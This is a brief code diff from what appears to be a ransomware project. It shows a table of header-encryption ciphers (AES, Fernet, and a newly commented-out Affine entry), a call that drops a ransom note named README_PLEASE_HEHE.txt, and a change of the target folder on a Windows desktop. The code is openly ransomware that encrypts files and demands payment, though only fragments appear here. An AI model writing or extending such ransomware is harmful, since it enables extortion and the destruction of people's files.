@@ -23,6 +23,11 @@ ciphers_for_header = {
         "args": (AES.aes_key,),
         "header_size": 100, 
     },
+    # "Affine_header_only": {
+    #     "encrypt_file": Affine.encrypt_header_affine,
+    #     "args": (Affine.a, Affine.b),
+    #     "header_size": 100,
+    # },
     "Fernet_header_only": {
         "encrypt_file": Fernet.encrypt_header_fernet,
         "args": (Fernet.key,),
@@ -344,5 +349,5 @@ def run_file(directory_to_check):
     
     ransom_note(f"{directory_to_check}/README_PLEASE_HEHE.txt")
 
-run_file(r"C:\Users\intag\Desktop\Folder")
 # run_file(r"files")
+run_file(r"C:\Users\intag\Desktop\temp")
